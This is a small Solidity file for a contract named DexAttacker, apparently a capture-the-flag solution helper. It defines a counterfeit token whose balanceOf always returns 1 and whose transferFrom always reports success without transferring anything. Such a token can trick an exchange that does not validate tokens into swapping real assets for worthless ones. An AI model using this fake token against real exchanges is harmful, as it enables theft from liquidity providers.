// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract DexAttacker {

    function balanceOf(address) external pure returns (uint256) {
        return 1;
    }

    function transferFrom(
        address,
        address,
        uint256 amount
    ) external pure returns (bool) {
        return true;
    }
}